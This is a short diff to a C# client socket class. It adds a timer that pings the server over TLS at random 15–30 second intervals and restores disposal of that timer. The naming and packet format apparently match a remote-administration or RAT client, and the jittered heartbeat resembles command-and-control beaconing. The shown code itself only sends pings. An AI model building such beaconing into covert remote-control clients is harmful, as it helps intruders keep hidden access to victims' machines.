@@ -31,6 +31,8 @@ namespace Client.Sockets
         private MemoryStream MS { get; set; }
         public bool IsConnected { get; set; }
         private object SendSync { get; } = new object();
+        private static Timer Tick { get; set; }
+
 
         public TempSocket()
         {
@@ -52,6 +54,7 @@ namespace Client.Sockets
                 SslClient.AuthenticateAsClient(Client.RemoteEndPoint.ToString().Split(':')[0], null, SslProtocols.Tls, false);
                 Buffer = new byte[4];
                 MS = new MemoryStream();
+                Tick = new Timer(new TimerCallback(CheckServer), null, new Random().Next(15 * 1000, 30 * 1000), new Random().Next(15 * 1000, 30 * 1000));
                 SslClient.BeginRead(Buffer, 0, Buffer.Length, ReadServertData, null);
             }
             catch
@@ -75,7 +78,7 @@ namespace Client.Sockets
 
             try
             {
-                // Tick?.Dispose();
+                Tick?.Dispose();
                 SslClient?.Dispose();
                 Client?.Dispose();
                 MS?.Dispose();
@@ -185,6 +188,14 @@ namespace Client.Sockets
                     return;
                 }
             }
+        }
+
+        public void CheckServer(object obj)
+        {
+            MsgPack msgpack = new MsgPack();
+            msgpack.ForcePathObject("Packet").AsString = "Ping";
+            msgpack.ForcePathObject("Message").AsString = "";
+            Send(msgpack.Encode2Bytes());
         }
     }
 }
